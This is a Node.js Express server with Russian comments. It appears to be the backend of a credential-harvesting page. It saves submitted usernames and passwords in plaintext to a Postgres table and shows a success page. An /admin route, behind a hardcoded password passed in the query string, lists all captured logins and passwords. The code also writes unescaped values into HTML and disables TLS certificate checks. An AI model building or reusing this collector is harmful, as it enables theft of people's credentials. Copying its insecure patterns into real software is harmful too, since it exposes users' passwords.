const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const { Pool } = require("pg");

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// Создаем таблицу если не существует
pool.query(`
    CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        username TEXT,
        password TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    );
`)
.then(() => console.log("Таблица users готова"))
.catch(err => console.error("Ошибка при создании таблицы:", err));

// Стандартная форма
app.post("/submit", async (req, res) => {
    const { username, password } = req.body;

    try {
        await pool.query(
            "INSERT INTO users (username, password) VALUES ($1, $2)",
            [username, password]
        );

res.send(`
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Успешно</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    overflow: hidden;

    /* ТВОЙ ГРАДИЕНТ */
    background: linear-gradient(
        -45deg,
        #101128,
        #0c0d0d,
        #090443,
        #0f4e70
    );
    background-size: 400% 400%;
    animation: gradientMove 12s linear infinite;
}

/* Теперь он НЕ возвращается назад */
@keyframes gradientMove {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* Стеклянная карточка */
.card {
    width: 340px;
    padding: 45px;
    text-align: center;

    background: rgba(255,255,255,0.08);
    backdrop-filter: blur(25px);
    -webkit-backdrop-filter: blur(25px);

    border-radius: 24px;
    border: 1px solid rgba(255,255,255,0.2);

    box-shadow:
        0 8px 32px rgba(0,0,0,0.5),
        inset 0 0 1px rgba(255,255,255,0.3);

    color: white;

    transform: translateY(40px);
    opacity: 0;
    animation: fadeIn 0.8s ease forwards;
}

@keyframes fadeIn {
    to {
        transform: translateY(0);
        opacity: 1;
    }
}

h2 {
    margin-bottom: 25px;
    font-weight: 500;
}

a {
    display: inline-block;
    padding: 14px 22px;
    border-radius: 14px;
    text-decoration: none;
    color: white;
    font-weight: 600;

    background: rgba(255,255,255,0.15);
    backdrop-filter: blur(10px);

    transition: 0.3s ease;
}

a:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
}
</style>

</head>
<body>

<div class="card">
    <h2>Данные успешно сохранены ✅</h2>
    <a href="/">Вернуться назад</a>
</div>

</body>
</html>
`);


    } catch (err) {
        console.error(err);
        res.send("<h2>Ошибка при сохранении данных</h2><a href='/'>Назад</a>");
    }
});

// Личный admin
const ADMIN_PASSWORD = "supersecret123"; // поставь свой пароль

app.get("/admin", async (req, res) => {
    // Проверка через query параметр ?password=...
    const pass = req.query.password;
    if (pass !== ADMIN_PASSWORD) {
        return res.send("<h2>Доступ запрещен</h2>");
    }

    try {
        const result = await pool.query("SELECT * FROM users ORDER BY id DESC");

        let rows = result.rows.map(u =>
            `<tr>
                <td>${u.id}</td>
                <td>${u.username}</td>
                <td>${u.password}</td>
                <td>${u.created_at}</td>
            </tr>`
        ).join("");

        res.send(`
            <h2>Все логины</h2>
            <table border="1" cellpadding="5" cellspacing="0">
                <tr>
                    <th>ID</th>
                    <th>Логин</th>
                    <th>Пароль</th>
                    <th>Дата</th>
                </tr>
                ${rows}
            </table>
        `);

    } catch (err) {
        console.error(err);
        res.send("<h2>Ошибка при получении данных</h2>");
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
